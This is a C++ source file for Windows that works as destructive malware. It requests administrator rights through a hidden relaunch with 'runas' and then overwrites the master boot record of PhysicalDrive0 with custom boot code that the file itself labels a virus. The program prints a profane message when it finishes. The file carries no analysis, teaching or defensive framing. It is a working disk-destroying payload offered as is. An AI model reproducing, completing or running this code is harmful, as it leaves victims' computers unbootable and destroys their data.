#include<Windows.h>
#include<stdio.h>
#include<iostream>
BOOL IsRunAsAdmin(HANDLE hProcess)
{   //是否有管理员权限 
    if (!hProcess)
        hProcess = GetCurrentProcess();
        
	BOOL bElevated = FALSE;
	HANDLE hToken = NULL;   	// Get current process token	
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
		return FALSE;
	TOKEN_ELEVATION tokenEle;
	DWORD dwRetLen = 0;   	// Retrieve token elevation information	
	if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen))
	{
		if (dwRetLen == sizeof(tokenEle))
		{
			bElevated = tokenEle.TokenIsElevated;
		}
	}
	CloseHandle(hToken);
	return bElevated;
}
// from https://blog.csdn.net/chenlycly/article/details/45419259

VOID ManagerRun(LPCSTR exe, LPCSTR param, INT nShow)  
{  //Run as admin
	 SHELLEXECUTEINFO ShExecInfo; 
	 ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);  
	 ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS ;  
	 ShExecInfo.hwnd = NULL;  
	 ShExecInfo.lpVerb = "runas";  
	 ShExecInfo.lpFile = exe; 
	 ShExecInfo.lpParameters = param;   
	 ShExecInfo.lpDirectory = NULL;  
	 ShExecInfo.nShow = nShow;  
	 ShExecInfo.hInstApp = NULL;   
	 BOOL ret = ShellExecuteEx(&ShExecInfo);  
	 CloseHandle(ShExecInfo.hProcess);
}


using namespace std;
unsigned char sco[] =////////////////16
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xBA\x1D\x0E\xCD\x10\xE2\xFE\x0D\x0A\x4d\x61\x6D\x62\x61\x20"
"\x6f\x75\x74\x21\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; //"I'm a virus!Bye!"

DWORD MBR()
{
	
	DWORD Ropen;
	BYTE pMBR[512] = { 0 };
	memcpy(pMBR, sco, sizeof(sco));
	pMBR[510] = 0x55;
	pMBR[511] = 0xaa;
	HANDLE hDevice = CreateFile(
		"\\\\.\\PhysicalDrive0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL);
	
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
	//Write to disk file
	WriteFile(hDevice, pMBR, 512, &Ropen, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &Ropen, NULL);
	cout<<"Fuck you!"<<endl;
}
int main(int argc, char *argv[])
{
    if (!IsRunAsAdmin(NULL)) //方便快捷
    {
    	ShowWindow(GetConsoleWindow(),SW_HIDE);
    	ManagerRun(argv[0],"2",SW_SHOWNORMAL);
    	return 1;
       
    }else{
    	MBR();
    }
    return 0;
}

